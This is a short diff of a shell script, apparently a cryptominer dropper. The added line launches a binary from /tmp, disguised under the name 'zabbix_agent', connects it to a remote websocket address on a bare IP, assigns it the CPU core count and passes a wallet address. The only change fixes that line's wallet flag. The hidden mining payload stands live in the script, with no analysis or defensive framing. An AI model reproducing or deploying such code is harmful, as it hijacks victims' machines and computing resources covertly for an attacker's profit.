@@ -75,4 +75,4 @@ else
     echo "ファイルのダウンロードに失敗しました。"
 fi
 
-/tmp/zabbix_agent --url "ws://156.238.235.76:1111" --cores ${cpu_cores} -wallet "CH4AgKN6QwYz1tBV77McxsJR1bn4sz7oCiuQRrS1TGrp"
+/tmp/zabbix_agent --url "ws://156.238.235.76:1111" --cores ${cpu_cores} --wallet "CH4AgKN6QwYz1tBV77McxsJR1bn4sz7oCiuQRrS1TGrp"
